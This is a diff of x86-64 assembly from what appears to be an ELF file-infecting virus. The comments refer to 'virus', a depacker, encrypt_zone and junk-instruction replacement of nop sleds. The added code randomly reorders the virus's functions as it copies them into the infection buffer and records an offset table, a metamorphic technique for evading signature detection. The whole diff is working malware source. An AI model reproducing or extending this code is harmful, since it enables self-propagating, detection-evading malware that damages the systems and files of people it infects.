@@ -245,24 +245,139 @@ _write_in_tmp_map:
 	rep movsb
 	add QWORD [rsp + 116], 8 ; add 8 to our index
 
-_copy_unencrypted_part:
-;; memcpy(mmap_tmp + index, _string, unencrypted_part_len)
+_copy_start_point:
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-; take _string addr, it's the base addr of the unencrypted part
-	lea	rsi, [rel _string]
-; take the encrypted_part_start addr, where is obviously the end addr of our
-; unencrypted part, and calcul the size o copy
-	lea rcx, [rel _encrypted_part_start]
-	sub rcx, rsi ; calcul the size to copy
+	lea rsi, [rel _string]
+	lea rcx, [rel _checkproc]
+	sub rcx, 8
+	sub rcx, rsi
+	add QWORD [rsp + 116], rcx ; add 8 to our index
 	cld
 	rep movsb
 
-; Incremente our index in our destination mmap
-	lea rsi, [rel _string]
+_copy_unencrypted_part:
+	.init:
+	mov QWORD [rsp + 156], 0 ; min
+	mov QWORD [rsp + 164], 9 ; max
+	lea r11, [rel _start]
+	lea r12, [rel _checkproc]
+	sub r12, 8
+	sub r12, r11
+	mov QWORD [rsp + 172], r12 ; first offset from start
+	lea r10, [rel _checkproc]
+	sub r10, 8
+	lea r11, [rel _functions_offset_from_start]
+	sub r11, r10
+	add r11, QWORD [rsp + 116]
+	add r11, QWORD [rsp + 108]
+	mov QWORD [rsp + 180], r11 ; offset to table_offset on mmap
+	mov QWORD [rsp + 188], 0
+	mov QWORD [rsp + 196], 0
+	mov QWORD [rsp + 204], 0
+	.loop:
+		mov rdi, QWORD [rsp + 156]
+		mov rsi, QWORD [rsp + 164]
+		mov rdx, 0x9485731273645823
+		xor rax, rax
+		call _urand
+		xor rcx, rcx
+		.look_for_unwrited_function:
+			cmp BYTE [rsp + 188 + rcx], 0
+			je .verif_rax
+				inc rcx
+				jmp .look_for_unwrited_function
+			.verif_rax:
+				cmp rax, 0
+				je .write_function
+				inc rcx
+				dec rax
+				jmp .look_for_unwrited_function
+		.write_function:
+		mov BYTE [rsp + 188 + rcx], 1
+		mov rax, rcx
+		mov rcx, 8
+		mul rcx
+		mov rdi, QWORD [rsp + 108]
+		add rdi, QWORD [rsp + 116]
+		lea rsi, [rel _functions_offset_from_start]
+		add rsi, rax
+		mov rcx, rsi
+		add rcx, 8
+		lea r10, [rel _start]
+		mov rsi, QWORD [rsi]
+		add rsi, r10
+		sub rsi, 8
+;		push rax
+;		push rdi
+;		push rsi
+;		push rcx
+;		push r10
+;		mov rax, SYS_WRITE
+;		mov rdi, 1
+;		mov rdx, 8
+;		syscall
+;		pop r10
+;		pop rcx
+;		pop rsi
+;		pop rdi
+;		pop rax
+		mov rcx, QWORD [rcx]
+		add rcx, r10
+		sub rcx, 8
+		cmp rax, 72
+		jl .not_at_end_table
+		lea rcx, [rel _functions_offset_from_start]
+		.not_at_end_table:
+		sub rcx, rsi
+		mov QWORD [rsp + 204], rcx
+		add QWORD [rsp + 116], rcx
+		cld
+		rep movsb
+		mov rdi, QWORD [rsp + 180]
+		mov rsi, QWORD [rsp + 172]
+		mov QWORD [rdi], rsi
+		add QWORD [rdi], 8
+		mov rsi, QWORD [rsp + 204]
+		add QWORD [rsp + 172], rsi
+		add QWORD [rsp + 180], 8
+		cmp QWORD [rsp + 164], 0
+		jle .inc_with_table_size
+		dec QWORD [rsp + 164]
+		jmp .loop
+	.inc_with_table_size:
+		push rax
+		push rdi
+		push rsi
+		push rcx
+		push r10
+		mov rax, SYS_WRITE
+		mov rdi, 1
+		mov rsi, QWORD [rsp + 148]
+		add rsi, QWORD [rsp + 156]
+		mov rdx, 80
+		syscall
+		pop r10
+		pop rcx
+		pop rsi
+		pop rdi
+		pop rax
+	add QWORD [rsp + 116], 80
+
+_copy_jump_to_function:
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	lea rsi, [rel _jump_to_function]
 	lea rcx, [rel _encrypted_part_start]
 	sub rcx, rsi
 	add QWORD [rsp + 116], rcx
+	cld
+	rep movsb
+; Incremente our index in our destination mmap
+;	lea rsi, [rel _string]
+;	lea rcx, [rel _encrypted_part_start]
+;	sub rcx, rsi
+;	add QWORD [rsp + 116], rcx
 
 _copy_encrypt_zone:
 ;; encrypt_zone(virus, virus_size, mmap_tmp + index)
@@ -308,13 +423,13 @@ _inject_modified_depacker:
 
 ; Then we run _byterpl(depacker start in destination, depacker size);
 ; to replace nop sleds by junks instructions
-	lea rcx, [rel _o_entry]
-	lea rsi, [rel _start]
-	sub rsi, rcx
-	mov rdi, QWORD [rsp + 108]
-	add rdi, rsi
-	add rdi, QWORD [rsp + 72]
-	call _byterpl
+;	lea rcx, [rel _o_entry]
+;	lea rsi, [rel _start]
+;	sub rsi, rcx
+;	mov rdi, QWORD [rsp + 108]
+;	add rdi, rsi
+;	add rdi, QWORD [rsp + 72]
+;	call _byterpl
 
 ; Incremente our index in our destination mmap
 	lea rsi, [rel _decrypt]
